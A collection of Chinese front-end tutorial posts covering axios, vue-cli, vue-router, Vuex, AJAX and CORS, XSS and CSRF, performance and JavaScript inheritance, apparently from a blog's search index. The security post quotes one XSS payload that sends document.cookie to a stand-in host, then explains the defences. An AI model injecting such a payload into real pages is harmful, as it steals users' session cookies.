    <content type="text"><![CDATA[基于Vue搭建CNODE社区 什么是axiosaxios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中，它本身具有以下特征： 从浏览器中创建XMLHttpRequest 从 nodejs 发出http请求 支持 Promise API 拦截请求和响应 转换请求和响应数据 取消请求 自动转换JSON数据 客户端支持防止 CSRF/XSRF 在Vue中使用get请求1、安装1npm install axios 2、引入加载1import axios from &apos;axios&apos; 3、将axios全局挂载到Vue原型上1Vue.prototype.$http = axios; // 这样就可以直接使用this.$http发送请求 4、发送请求（以CNODE社区API为例）12345678910111213141516171819202122使用传统的function：getData()&#123; var self = this; // 传统的function需要将this赋值给一个新的变量 this.$http.get(&apos;https://cnodejs.org/api/v1/topics&apos;) .then(function (res) &#123; // 如果直接使用this.items = res.data.data 会出错，因为此处的this指向的不是当前vue实例 self.items = res.data.data console.log(res.data.data) &#125;) .catch(function (err) &#123; console.log(err) &#125;)&#125;ES6箭头函数的写法getData()&#123; this.$http.get(&apos;https://cnodejs.org/api/v1/topics&apos;) .then(res =&gt;&#123; // 可以直接使用this，因为箭头函会继承它父类的this this.items = res.data.data console.log(res) &#125;)&#125; 两种传递参数的形式：12345678910推荐：（都是CNODE官方提供的API）axios.get(&apos;url&apos;, &#123; params: &#123; page: 1, // 页码 limit: 10 // 每页显示的数量 &#125;&#125;)将参数直接写在地址后面：axios.get(&apos;https://cnodejs.org/api/v1/topics?page=1&amp;limit=15&apos;) post请求POST传递数据有两种格式： form-data?page=1&amp;limit=10 x­www­form­urlencoded { page: 1,limit: 10 } 但因为在axios中post请求接收的参数必须是form-data的格式，所以需要用到一个qs插件来转换参数格式123456789101112首先 npm install qsqs.stringify可以将格式转换成form-data的形式postData()&#123; this.$http.post(&apos;url&apos;,qs.stringify(&#123; page:1, limit:10 &#125;)).then(res=&gt;&#123; this.items = res.data.data; console.log(res) &#125;)&#125;]]></content>
      <tags>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue-cli脚手架搭建项目]]></title>
    <url>%2F2018%2F08%2F23%2Fvue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E6%90%AD%E5%BB%BA%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[项目搭建、目录结构分析及vue-router、Vuex的使用 项目搭建1、在电脑上安装最新版的nodeJS，安装完成后安装淘宝镜像1npm install -g cnpm --registry=https://registry.npm.taobao.org 2、全局安装vue-cli1npm install -g vue-cli // 如果已经安装过nodejs和vue-cli，可直接进行项目初始化 3、进入想要存放项目文件的目录下，然后初始化项目1vue init webpack my-project 4、进入项目文件1cd my-project 5、安装依赖1npm install 6、启动项目1npm run dev 打开http://localhost:8080，你会看到 目录结构build 项目构建(webpack)相关代码 build.js // 生产环境构建代码 check-version.js // 检查node&amp;npm等版本 dev-client.js // 热加载相关 dev-server.js // 构建本地服务器 utils.js // 构建配置共用工具 vue-loader.conf.js // vue加载器 webpack.base.conf.js // webpack基础环境配置 webpack.dev.conf.js // webpack开发环境配置 webpack.prod.conf.js // webpack生产环境配置 config 项目开发环境配置相关代码 dev.env.js // 开发环境变量 index.js // 项目一些配置变量 prod.env.js // 生产环境变量 node_modules 项目依赖模块，npm install执行后初始化项目会将所有依赖放在这里 src 源码目录 assets // 资源目录 eg：logo.png components // vue公共组件 eg：App.vue router // 前端路由 eg：index.js路由配置文件 App.vue // 页面入口文件（根组件） main.js // 程序入口文件（入口js文件） static 静态文件（比如图片、json数据等） .gitkeep 其他 .babelrc // ES6语法编译配置 .editorconfig // 定义代码格式 .gitignore // git上传需要忽略的文件格式 index.html // 入口页面 package.json // 项目基本信息 README.md // 项目说明 vue-router路由1、安装1npm install --save vue-router 2、引用12import router from &apos;vue-router&apos;Vue.use(router) 3、配置路由文件，并在vue实例中注入1234567891011121314151617var rt = new router(&#123; routes: [ // 配置 &#123; path: &apos;/hello&apos;, //指定要跳转的路径 component: HelloWorld //指定要跳转的组件 &#125; ]&#125;)new Vue(&#123; el: &apos;#app&apos;, router:router, // 实例中注入 components: &#123; App &#125;, template: &apos;&lt;App/&gt;&apos;&#125;) 4、确定视图加载位置1&lt;router-view&gt;&lt;/router-view&gt; 路由的跳转12345678910&lt;template&gt; &lt;ul&gt; &lt;li&gt; &lt;router-link to=&quot;/helloworld&quot;&gt;HELLO WORLD&lt;/router-link&gt; &lt;/li&gt; &lt;li&gt; &lt;router-link to=&quot;/helloearth&quot;&gt;HELLO EARTH&lt;/router-link&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/template&gt; 路由参数的传递1、必须在路由内加入路由的name 2、必须在path后加/: +传递的参数 1234567891011121314151617181920&lt;router-link :to=&quot;&#123; name: helloearth, params: &#123;msg: 只有一个地球&#125; &#125;&quot;&gt;HELLO WORLD&lt;/router-link&gt;读取参数： $route.params.XXX方式：===/helloworld/你好世界&lt;router-link :to=&quot;&#123; path: &apos;/helloearth&apos;, query: &#123;msg: 只有一个地球&#125; &#125;&quot;&gt;HELLO WORLD&lt;/router-link&gt;方式：===/helloworld?name=XX&amp;count=xxx函数模式：可以创建一个函数返回 props，这样便可以将参数转换成另一种类型，将静态值与基于路由的值结合const router = new VueRouter(&#123; routes: [ &#123; path: &apos;/search&apos;, component: SearchUser, props: (route) =&gt; (&#123; query: route.query.q &#125;) &#125; ]&#125;) Vuex的store状态管理用来管理状态，共享数据，在各个组件之间管理外部状态，使用方法： 安装Vuex 1npm install vuex 引入vuex，并通过use方法使用 12import Vuex from &apos;vuex&apos;Vue.use(Vuex) 创建状态仓库 123456// Store必须是大写，参数state不能改名字var store = new Vue.Store(&#123; state: &#123; xxx: yyy &#125;&#125;) 通过 this.$store.state.xxx 拿到全局状态 Vuex下的mutations、actions和gettersvuex状态管理的流程： view -&gt; actions -&gt; mutations –&gt; state —­&gt; view mutations和actions的不同之处： 参数：mutations接收的参数是state，actions接收的是context 异步操作：mutations只能包含同步操作，而actions可以包含异步操作 mutations直接变更状态（state），而actions提交的是mutation而非直接变更状态 调用方式：mutations通过this.$store.commit(‘’)调用，actions通过this.$store.dispatch(‘’)调用 注意：actions是可有可无的，没有actions的话，view直接走mutations中的逻辑，但是如果有异步操作，则必须使用actions 1234567891011121314151617181920var store = new Vue.Store(&#123; state: &#123; xxx: yyy &#125;, mutations: &#123; // 调用：this.$store.commit(&apos;xxx&apos;)参数为字符串格式 aaa:function(state)&#123; // 一些操作 &#125; &#125;, actions: &#123; // 调用：this.$store.dispatch(&apos;xxx&apos;) bbb:function(context)&#123; context.commit(&apos;aaa&apos;); &#125; &#125;, getters:&#123; // 调用：this.$store.getters.ccc ccc(state)&#123; return ... ... &#125; &#125;&#125;)]]></content>
      <tags>
        <tag>vue-cli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AJAX]]></title>
    <url>%2F2018%2F08%2F20%2FAJAX%2F</url>
    <content type="text"><![CDATA[Ajax 的主要优势就是对页面的请求以异步的方式发送到服务器，而服务器不会以整个页面来响应请求，它会在后台处理，与此同时用户还能继续浏览页面并与页面交互。Ajax 的核心技术就是 XMLHttpResquest 对象，这个对象充当浏览器中的脚本（客户端）与服务器之间的中间人角色，以往的请求都是由浏览器发出，而JS通过这个对象可以自己发送请求，同时自己处理响应。 使用原生JS写一个AJAX请求1234567891011121314function getNewContent()&#123; let request = new XMLHttpRequest() // 创建一个新对象 request.open(method,url); // open 方法用来指定请求方法，请求地址或路径 request.onreadystatechange = function()&#123; // onreadystatechange 是一个事件处理函数，在服务器给 XMLHttpRequest 对象送回响应时触发，函数内容主要是处理响应 if(request.readyState === 4)&#123; // 监听请求状态的改变，当 readyState 的属性变成4时，说明请求完成了 if(request.status &gt;= 200 &amp;&amp; request.status &lt; 300)&#123; // 如果请求完成，且状态码返回2xx，表示请求成功 console.log(request.responseText) &#125;else if(request.status &gt;= 400)&#123; // 如果请求完成，且状态码返回4xx，表示请求失败 console.log(&apos;请求失败&apos;) &#125; &#125; &#125; request.send(body) // 在指定了请求体，也明确了如何处理响应后，就可以用 send 方法来发送请求&#125; jQuery对ajax的封装123$.get(&apos;filename&apos;).then(function(response)&#123; // 这里是response的内容&#125;) 目前常见的是用ajax请求JSON格式的数据123$.get(&apos;/data.php&apos;).then(function(response)&#123; // response内容为 &#123; &quot;name&quot;: &quot;jayce&quot; &#125;&#125;) 同源策略在使用AJAX时要注意同源策略，使用XMLHttpRequest对象发送请求只能访问与其所在的HTML处于同一个域中的数据，不能向其他域发送请求。同源政策的目的是为了保证用户信息的安全，防止恶意的网站窃取数据。只有（协议+域名+端口）一模一样时才允许发 AJAX 请求，eg： http://baidu.com 可以向 http://www.baidu.com 发 AJAX 请求吗？ no协议不同 http://baidu.com:80 可以向 http://baidu.com:81 发 AJAX 请求吗？ no端口不一样 CORS跨域CORS全称是跨域资源共享（Cross-origin resource sharing）能克服 AJAX 只能同源使用的限制，告诉浏览器我们是一家的别阻止他。简单来说就是服务端在响应头中添加一个 Access-Control-Allow-Origin 的头部，头部的值为客户端的域名，eg：1response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;url&apos;) JSONP与AJAX相同点： ajax和jsonp的调用方式很像，目的一样，都是请求url，然后把服务器返回的数据进行处理 不同点： AJAX（异步的Javascript和XML）核心是通过XMLHttpRequest请求内容，支持get、post、delete等。（通过CORS可以突破同源政策的限制实现跨域请求） JSONP的核心则是通过动态添加script标签来调用服务器提供的js脚本（后缀.json)，只支持get请求。（网页通过添加一个script元素向服务器请求JSON数据，这种做法不受同源政策的限制，服务器在收到请求后，将数据打包放在一个指定名字的回调函数里传回来）]]></content>
      <tags>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全：XSS和CSRF]]></title>
    <url>%2F2018%2F08%2F16%2F%E5%AE%89%E5%85%A8%EF%BC%9AXSS%E5%92%8CCSRF%2F</url>
    <content type="text"><![CDATA[初次理解XSS和CSRF攻击 XSS全称 Cross Site Script 跨站脚本攻击，原本缩写为CSS，但为了区别于层叠样式表，在安全领域称为XSS。 XSS攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。 有多种方式进行XSS攻击，但它们的共同点是：将一些隐私数据像cookie、session发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者使用的机器上进行一些恶意操作 常见的基于DOM的XSS攻击是指通过恶意脚本修改页面DOM结构，是纯粹发生在客户端的攻击，eg：123div.innerHTML = userComment// userComment 内容是 &lt;script&gt;$.get(&apos;http://hacker.com?cookie=&apos; + document.cookie)&lt;/script&gt; 此时恶意就被执行了 XSS防范1、HttpOnly 这个属性可以防止XSS，它会禁止javascript脚本来访问cookie。 前面说道攻击者可以通过注入恶意脚本获取用户的cookie信息，通常cookie中都包含了用户的登录凭证信息，攻击者在获取到cookie之后，就可以发起cookie劫持攻击。所以严格来说HttpOnly并非阻止XSS攻击，而是阻止XSS攻击后的cookie劫持 2、不要使用innerHTML，改成innerText，此时script标签里的内容就会被当成文本，不执行。 如果一定要用innerHTML，使用字符过滤（XSS filter），在前端框架中一般都会有一份decodingMap，用于对用户输入的包含特殊字符进行过滤123456const decodingMap = &#123; &apos;&amp;lt;&apos;: &apos;&lt;&apos;, &apos;&amp;gt;&apos;: &apos;&gt;&apos;, &apos;&amp;quot;&apos;: &apos;&quot;&apos;, &apos;&amp;amp;&apos;: &apos;&amp;&apos;,&#125; CSRF全称：Cross Site Request Forgery 即跨站请求伪造，是一种劫持受信任用户像服务器发送非预期请求的攻击方式 通常情况下，CSRF攻击是攻击者借助受害者的cookie骗取服务器信任，可以在受害者不知情的情况下以受害者名义伪造请求发送给受攻击的服务器，从而在并未授权的情况下执行在权限保护之下的操作 eg： 用户在 qq.com 登陆 用户切换到 hacker.com （恶意网站） hacker.com 发送一个 qq.com/add-friend 的请求，让用户添加hacker为好友 用户在不知情的情况下添加了hacker为好友 用户本身没有想发送这个请求，但hacker伪造了用户发请求的假象 由于 cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起CSRF攻击。在攻击过程中，攻击者借助受害者的cookie骗取服务器信任，但并不能拿到cookie，也看不到cookie的内容，对于服务器返回的内容，由于同源策略的限制，也无法进行解析。所以，攻击者无法从返回结果中得到任何东西。所能做的就是给服务器发送请求，执行请求中的命令，在服务器直接改变数据的值，而非窃取服务器中的数据。 CSRF防范1、验证码从上面的例子可以看出，CSRF攻击往往是在用户不知情的情况下构造了网络请求，而验证码会强制用户与应用进行交互，才能最终完成并提交请求。 2、Referer Check根据HTTP协议，在HTTP头部有一个字段叫 Referer ，它记录着HTTP请求的来源地址，通过它可以检查请求是否来自合法的源。因此要防范CSRF攻击，只需验证它的 Referer 值，如果是以相同域名开头的，就是来自网站自己的请求，是合法的，如果是来自其他网站的，可以拒绝该请求 3、添加token验证CSRF攻击能成功的原因在于攻击者可以伪造用户请求，该请求中所有的用户验证信息都存在于cookie中，要抵御该攻击，关键是要在请求中放入攻击者不能伪造的信息，并且该信息不能存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证 token，从而判断是否是CSRF攻击 更多详细内容：https://mp.weixin.qq.com/s/Rf4dag7Z1rFNl4LxbAjyqw]]></content>
  </entry>
  <entry>
    <title><![CDATA[web前端性能优化]]></title>
    <url>%2F2018%2F08%2F14%2Fweb%E5%89%8D%E7%AB%AF%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[从输入url到页面加载完成的过程分析前端可以做的优化 1、发送HTTP请求，使用Cache-Control通过在 HTTP 协议添加Cache-Control头部来告诉浏览器当前资源是否缓存，帮助浏览器进行有条件请求。Cache-Control 的值可以是 public, private, no-cache, no-store, no-transform 等 max-age(单位为 s) 设定缓存最大的有效时间，Cache-Control: max-age=3600 表示该资源在浏览器端一个小时内均有效。 s-maxage(单位是 s) 设定共享缓存时间，比如 CDN 或者代理。 no-store 网络资源不缓存，每次都到服务器上拉取。 no-cache 表示网络资源可以缓存一份，但使用前必须询问服务器此资源是不是最新的。 public 表明响应可以被任何对象（客户端，代理服务器等）缓存。 private 表明响应只能被单个用户缓存，其它用户或者代理服务器不能缓存这些数据。 2、发送HTTP请求，增加域名以并行下载资源把组件分散到不同的域名下最大化并行下载数。 但是对于需要减少DNS查询来说，就要减少域名，想增加HTTP请求的并发数又要增加域名，两者产生矛盾。权衡之下，如果文件很少，就没有必要增加域名；反之，就增加域名。基于DNS查询的副作用，最佳的不同域名数是2-4。 3、接收响应时，使用EtagEtag是服务器和浏览器之间判断浏览器缓存中某个组件是否未发生改变的一种机制，服务器像下面这样设置Etag：1234HTTP/1.1 200 OKLast-Modified: Tue, 12 Dec 2006 03:03:59 GMTETag: &quot;10c24bc-4ab-457e1c1f&quot; // md5Content-Length: 12195 之后，当浏览器要验证该组件是否修改过，会在请求头里设置if-None-Match，并附上这个md5值。于是在请求的时候，如果这个md5值和你之前文件的md5值一样，说明文件没有更新，不需要下载12345GET /i/yahoo.gif HTTP/1.1Host: us.yimg.comIf-Modified-Since: Tue, 12 Dec 2006 03:03:59 GMTIf-None-Match: &quot;10c24bc-4ab-457e1c1f&quot; // 与原文件相同，返回304HTTP/1.1 304 Not Modified Etag和缓存的区别在于：缓存不会发请求，而ETag会发请求，并比较md5值是否一样，从而返回304。 4、接收响应时，使用Gzip压缩传输时用Gzip压缩，压缩可以通过减少http响应的大小减少响应时间。从HTTP/1.1开始，客户端通过http请求中的Accept-Encoding头部来提示支持的压缩：1Accept-Encoding: gzip, deflate 如果服务器看到这个头部，它可能会选用列表中的某个方法压缩响应。服务器通过Content-Encoding头部提示客户端：1Content-Encoding: gzip gzip一般可减小响应的70%。尽可能去压缩更多类型的文件。html，脚本，样式，xml和json等等都应该被压缩，而图片，pdf等等不应该被gzip，因为它们本身已被压缩过。 5、对于CSS和JS文件，使用CDN（Content Delivery Network）用户离服务器越近，会减少响应时间。CDN是一群不同地点的服务器，它将资源分布到世界各地，这样不同地点的人会根据距离选择离得最近的服务器，从而使页面加载更快 6、调整CSS和JS文件位置将CSS放在头部，让它能够尽早下载；JS放在body最后，确保JS不会阻塞HTML加载，以保证用户先看到一个完整画面 对于CSS文件来说，IE不会阻塞HTML，会在看到标签时就渲染在页面上，回头等CSS加载完后，再次重新渲染页面；而Chrome会阻塞HTML，它会在CSS下载好之后再渲染标签。所以最好的方式是将CSS文件放在一开始就需要加载的位置上 对于JS文件，不管是IE还是Chrome，它都会阻塞HTML的渲染，所以干脆将它放在body最后，让它最后一个加载。 7、压缩图片 优化jpg和png 使用 pngcrush 或其它工具压缩png使用 jpegtran 或其它工具压缩jpeg 如果真的需要追求各种图片的极限压缩，可以参阅这些工具的文档，但是对于一般的Web应用，面对的图片种类多样，几乎不可能在工程中实现对每种工具的独立配置，因此推荐使用以下工具来进行优化。 ImageOptim (Mac) 主页：https://imageoptim.com/Mac平台下非常赞的图片优化工具，只需要把需要优化的图片拖拽进ImageOptim，就能够完成对图片的优化。设置选择的也很丰富，目前支持JPG和PNG的优化。 Kraken (Web) 主页：https://kraken.io/在免费模式下可以上传图片，优化后打包下载。适合偶尔有图片优化需求，或者不在开发机上没有优化软件可以使用的情况。 智图 (Web) 主页：http://zhitu.tencent.com/腾讯ISUX团队有篇文章介绍智图：http://isux.tencent.com/zhitu.html 优化SVG SVGO 工具可以缩减SVG文件的体积；由于SVG是基于XML的格式，本质上是纯文本，所以还可以采用GZIP压缩来减小传输大小，但这需要一些服务器配置。 自动优化主要介绍CDN、Grunt/Gulp、Google PageSpeed三种方式。 1、CDN CDN七牛和又拍在这方面都做了大量工作。其工作方式为，向CDN请求图片的URL参数中包含了图片处理的参数（格式、宽高等），CDN服务器根据请求生成所需的图片，发送到用户浏览器。 七牛云存储的图片处理接口极其丰富，覆盖了图片的大部分基本操作，例如： 图片裁剪，支持多种裁剪方式（如按长边、短边、填充、拉伸等） 图片格式转换，支持JPG, GIF, PNG, WebP等，支持不同的图片压缩率 图片处理，支持图片水印、高斯模糊、重心处理等 2、Grunt/Gulp 用于图片优化的Grunt组件：grunt-image。前端工程师的重复性工作，例如合并静态资源、压缩JS和CSS文件、编译SASS等都可以使用Grunt等自动化工具批量完成，图片优化也是如此。 grunt-image非常强大，按照作者的介绍，其内部加载的图片优化工具包括了pngquant, optipng, advpng, zopflipng, pngcrush, pngout, mozjpeg, jpegRecompress, jpegoptim, gifsicle和svgo。支持批量自动优化PNG, JPG, SVG和GIF，速度也不错，配置方式支持单图片优化和全目录优化 3、Google PageSpeed Google PageSpeed这个服务器模块，可以在apache或ngnix中加载，通过在服务器配置文件中进行设置来进行自动化的优化。对于图片格式转换、图片优化甚至图片LazyLoad都有相关选项。]]></content>
      <tags>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何实现继承]]></title>
    <url>%2F2018%2F08%2F13%2F%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[ES5与ES6的两种写法 继承使得子类具有父类别的各种属性和方法叫做继承 ES5实现继承父类：Human12345678function Human(name)&#123; this.name = name // 父类的自有属性&#125;Human.prototype.run = function()&#123; // 原型上的公有属性 console.log(&quot;我叫&quot; + this.name + &quot;，我在跑&quot;) return undefined&#125; 子类：Man12345678910function Man(name)&#123; Human.call(this.name) // 1、调用父类Human，拥有this.name = name的属性 this.gender = &apos;男&apos; // 子类的自有属性&#125;Man.prototype.__proto__ = Human.prototype // 2、将Man的原型 链到 Human的原型上Man.prototype.fight = function()&#123; // 子类原型上的公有属性 console.log(&apos;捶你胸口&apos;)&#125; 但是由于IE不支持第二句Man.prototype.proto = Human.prototype，用下面三句话可以代替123var f = function()&#123;&#125; // 构造空函数f.prototype = Human.prototype // 让空函数的原型指向Human（父类）的原型Man.prototype = new f() // 此时f()就是去掉了 this.name = name 的Human 使用new命令相当于执行了下面四步： 创建一个临时空对象作为要返回的对象实例 var temp = {} 将这个空对象的原型指向构造函数的prototype属性 this.proto = 构造函数.prototype 将这个空对象赋值给函数内部的this关键字 this = temp 执行构造函数内部代码，并返回this return this prototype属性只有一个功能就是存放公有属性对象的地址 ES6实现继承123456789101112131415161718192021父类：Humanclass Human &#123; constructor(name)&#123; this.name = name // 自有属性 &#125; run()&#123; // 公有属性，直接写在原型链（prototype）上的 console.log(&quot;我叫&quot; + this.name + &quot;，我在跑&quot;) return undefined &#125;&#125;子类：Manclass Man extends Human &#123; // extends关键字等价于 Man.prototype.__proto__ = Human.prototype constructor(name)&#123; super(name) // 调用父类，等价于Human.call(this, name)使得子类拥有this.name = name的属性 this.gender = &apos;男&apos; // 子类的自有属性 &#125; fight()&#123; console.log(&apos;捶你胸口&apos;) // 子类的公有属性，写在Man.prototype上的 &#125;&#125; 总结有了ES6的extends写法，我们构造函数与函数的继承显得十分简单，它帮我们省去了链接原型到另一个原型的复杂步骤，但是它不能帮助我们很好的理解js的原型以及继承的原理，所以真正搞懂ES5的继承写法会让你对原型的理解有很深刻的挖掘]]></content>
      <tags>
        <tag>继承</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue的双向绑定]]></title>
    <url>%2F2018%2F08%2F11%2Fvue%E7%9A%84%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A%2F</url>
    <content type="text"><![CDATA[MVVM模式的体现 vue双向绑定原理（采用Object.defineProperty()数据劫持 + 发布订阅模式）通过ES5提供的Object.defineProperty()方法，监控对数据的操作（劫持各个属性的setter、getter，在数据变动时发布消息给订阅者，触发相应的监听回调），从而自动触发数据同步。并且由于是在不同的数据上触发同步，可以精确地将变更发送给绑定的视图，而不是对所有数据都进行一次检测。简单应用：123456789101112var obj = &#123;&#125;;Object.defineProperty(obj, &apos;hello&apos;, &#123; get: function() &#123; console.log(&apos;get方法获取值&apos;); &#125;, set: function(val) &#123; console.log(&apos;set方法设置的值为：&apos; + val); &#125;&#125;);obj.hello; // get方法获取值obj.hello = &apos;Hello World&apos;; Object.defineProperty()函数接受三个参数，且都是必须的： 第一个参数：目标对象 第二个参数：需要定义的属性或方法的名字。 第三个参数：目标属性所拥有的特性。 具体步骤： 需要observe的数据对象进行递归遍历，包括子属性对象的属性，都加上 setter和getter这样的话，给这个对象的某个值赋值，就会触发setter，那么就能监听到了数据变化 compile解析模板指令，将模板中的变量替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，更新视图 Watcher订阅者是Observer和Compile之间通信的桥梁，主要做的事情是: 1、在自身实例化时往属性订阅器(dep)里面添加自己 2、自身必须有一个update()方法 3、待属性变动dep.notice()通知时，能调用自身的update()方法，并触发Compile中绑定的回调，则功成身退。 MVVM作为数据绑定的入口，整合Observer、Compile和Watcher三者，通过Observer来监听自己的model数据变化，通过Compile来解析编译模板指令，最终利用Watcher搭起Observer和Compile之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(input) -&gt; 数据model变更的双向绑定效果。 如何使用假如我们要实现一个用户在输入框输入内容，页面上会自动更新的效果12345678910111213html:&lt;div id=&quot;app&quot;&gt; &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt; &lt;input v-model=&quot;message&quot;&gt;&lt;/input&gt;&lt;/div&gt;JS:var vm = new Vue(&#123; el:&apos;app&apos;, data: &#123; message:&apos;Hello,this is Jayce!&apos; &#125;&#125;) v-model只是一个语法糖1&lt;input v-model=&quot;x&quot;&gt; 相当于1&lt;input v-bind:value=&quot;x&quot; @input=&quot;x = $event&quot;&gt; 原理是绑定了一个input事件，将x的值传递给子组件，如果子组件的值更新了，它会发出一个input事件，input会传来x最新的值，再将这个最新的值event赋值给x，从而实现双向绑定 优缺点双向绑定给人最大的优越感就是方便，当data发生变化时，页面也会自动更新，但这也伴随着一个缺点，我们无从知道data是什么时候变的，是谁变的，变化后也没有人来通知你，虽然说watch可以用来监听data的变化，但这样岂不是变得更复杂，不如用单向数据绑定，Vuex的单向数据绑定就满足了这种控制欲，虽然牺牲了一部分便捷性，但是换来的却是更强的控制力。]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue常见知识点]]></title>
    <url>%2F2018%2F08%2F11%2Fvue%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
    <content type="text"><![CDATA[梳理知识点 vue框架与jQuery的区别jQuery是使用选择器（$）选取DOM对象，对其进行赋值、取值、事件绑定等操作，和原生的HTML的区别只在于可以更方便的选取和操作DOM对象，而数据和界面是在一起的。比如需要获取label标签的内容：$(“lable”).val(); 它还是依赖DOM元素的值。 Vue使用MVVM模式，通过数据来显示视图层而不是节点操作，主要业务逻辑都放在viewModel中，视图和数据不直接进行数据交流 一个组件实例12345678910Vue.component(&apos;定义一个组件名,组件名最好是带小横线的写法，尽量不要使用驼峰命名法button-counter&apos;, &#123; data: function() &#123; // data必须返回一个函数 return &#123; count: 0 &#125; &#125;, template: ` // 模版下只能有一个根元素 &lt;button @click=&quot;count++&quot;&gt;You clicked me &#123;&#123; count &#125;&#125;times.&lt;/button&gt; `&#125;) 将这个组件作为自定义元素使用123456789html:&lt;div id=&quot;components-demo&quot;&gt; &lt;button-counter&gt;&lt;/button-counter&gt;&lt;/div&gt;JS:var vm = new Vue(&#123; el: &apos;#components-demo&apos;&#125;) 实例生命周期钩子1、什么是生命周期 每个Vue实例从创建到销毁的过程就是生命周期，它的经历包括开始创建、初始化数据、编译模版、挂载到DOM、渲染更新、卸载。可以分为10个阶段：创建前/后（create），挂载前/后（mount）、更新前/后（update）、启动前/后（active）、销毁前/后（destroy） 2、生命周期函数的作用 生命周期中有许多事件钩子，让我们在控制整个Vue实例的过程中更容易形成好的逻辑 created 实例创建完成后调用，此阶段完成了数据的观测等，但尚未挂载， $el 还不可用。需要初始化处理一些数据时会比较有用 —-还未挂载 mounted el 挂载到实例上后调用，一般我们的第一个业务逻辑会在这里开始 。相当于 $(document).ready() —刚刚挂载 beforeDestroy 实例销毁之前调用。主要解绑一些使用 addEventListener 监听的事件等。 3、第一次页面加载会触发哪几个钩子？DOM渲染在哪个周期就完成了？ 第一次页面加载会触发beforeCreate、created、beforeMount、mounted这四个钩子 DOM渲染在mounted中就已完成 computed计算属性的用法？与methods的区别官方解释：对于复杂的逻辑我们应该用计算属性，例如想多次引用一个翻转字符123456789101112131415161718html:&lt;div id=&quot;demo&quot;&gt; &lt;p&gt;Original message: &quot;&#123;&#123; message &#125;&#125;&quot;&lt;/p&gt; &lt;p&gt;Reversed message: &quot;&#123;&#123; reversedMessage &#125;&#125;&quot;&lt;/p&gt;&lt;/div&gt;JS:var vm = new Vue(&#123; el: &apos;demo&apos;, data: &#123; message: &apos;Hello&apos; &#125;, computed: &#123; reversedMessage: function()&#123; return this.message.split(&apos;&apos;).reverse().join(&apos;&apos;) &#125; &#125;&#125;) 与methods的区别： 两种方式的最终结果是一致的，但唯一不同的是计算属性是基于它们的依赖进行缓存的，也就是说只有在他的相关依赖发生改变时才会重新求值，而调用方法总是会在触发重新渲染时再次执行函数 当有一个性能开销巨大的项目时，它需要计算属性A，它需要遍历一个巨大的数组并且进行大量的运算，也有可能一些其他的计算属性依赖于属性A，假如没有缓存，每次调用属性都会重新对A进行一次计算，如果不希望有这些缓存，那么就可以用methods来代替 v-if与v-show1、区别 手段：v-if是动态的向DOM树内添加或者删除DOM元素；v-show是通过设置DOM元素的display样式属性控制显隐； 编译条件：v-if是惰性的，如果初始条件为假，则什么也不做，直到条件第一次变为真时，才会开始渲染条件块; v-show不管初始条件是什么，元素总是会被渲染，然后被缓存，而且DOM元素保留； 编译过程：v-if切换有一个局部编译/卸载的过程，它会在切换过程中合适地销毁和重建内部的事件监听和子组件；v-show只是简单的基于css切换； 性能消耗：v-if有更高的切换消耗；v-show有更高的初始渲染消耗； 2、使用场景 v-if适合运行条件不大可能会改变；v-show适合频繁切换 对于管理系统的权限列表的展示，可以使用v-if来渲染，如果用到v-show，对于用户没有的权限，在网页的源码中，仍然能够显示出该权限，如果用v-if，网页的源码中就不会显示出该权限。（在前后台分离情况下，后台不负责渲染页面的场景。） 对于前台页面的数据展示，推荐使用v-show，这样可以减少开发中不必要的麻烦。 3、总结 两者都是用来控制元素的渲染。v-if会判断是否需要加载，只在需要时加载可减轻服务器压力，但具有更高的切换开销；v-show通过改变DOM元素的CSS的display属性，可以使用户操作更加流畅，但有更高的初始渲染开销。如果需要频繁切换状态就用v-show，若运行条件很少会改变，用v-if较好 Vuex1、官方定义：专门为Vue.js应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。 2、Vuex解决了什么问题 组件之间的数据通信 使用单向数据流的方式进行数据的中心化管理（所谓的单向数据流，就是当用户进行操作的时候，会从组件发出一个 action，这个 action 流到 store 里面，触发 store 对状态进行改动，然后 store 又触发组件基于新的状态重新渲染）对于复杂的应用来说，Vuex实施统一管理，方便维护和跟踪 3、举例说明Vuex的好处（反证法） 我们不好说为什么使用Vuex，但是如果在下面这种情况下不使用Vuex，将会带来很多弊端 假设在一个app里有四个tab，每个tab都需要获取用户的资料，如果数据在每个tab组件里都保存了一份，那么用户在手动更新了资料后，这四个tab都需要更新一遍用户资料来保证用户在每个地方看到的数据永远都是最新的。如果说每进一次tab都重新请求一下： 